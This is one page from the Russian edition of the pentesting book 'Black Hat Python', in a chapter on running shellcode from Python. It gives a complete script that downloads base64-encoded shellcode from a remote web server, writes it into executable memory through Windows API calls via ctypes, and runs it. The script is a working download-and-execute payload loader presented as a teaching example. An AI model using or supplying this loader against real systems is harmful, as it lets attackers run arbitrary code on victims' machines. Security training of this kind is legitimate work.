# Black Hat Python. Программирование для хакеров и пентестеров — страница 165

Источник: `Black Hat Python. Программирование для хакеров и пентестеров.pdf`

Выполнение шелл-кода на Python   165
и получить указатель функции на него с помощью модуля ctypes . Затем
останется лишь вызвать эту функцию.
В примере мы воспользуемся модулем urllib, чтобы взять шелл-код с веб-
сервера в формате base64 с последующим его выполнением. Начнем! Создайте
файл shell_exec.py и наберите такой код:
from urllib import request
import base64
import ctypes
kernel32 = ctypes.windll.kernel32
def get_code(url):
    with request.urlopen(url) as response: 
        shellcode = base64.decodebytes(response.read())
    return shellcode
def write_memory(buf): 
    length = len(buf)
    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.RtlMoveMemory.argtypes = (
    ctypes.c_void_p,
    ctypes.c_void_p,
    ctypes.c_size_t)
    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40) 
    kernel32.RtlMoveMemory(ptr, buf, length)
    return ptr
def run(shellcode):
    buffer = ctypes.create_string_buffer(shellcode) 
    ptr = write_memory(buffer)
    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None)) 
    shell_func() 
if __name__ == '__main__':
    url = "http://192.168.1.203:8100/shellcode.bin"
    shellcode = get_code(url)
    run(shellcode)
Потрясающе, не правда ли? Главный блок начинается с вызова функции
get_code, которая скачивает с веб-сервера шелл-код в формате base64 . За -
тем вызывается функция run, чтобы записать этот шелл-код в память и вы-
полнить его.
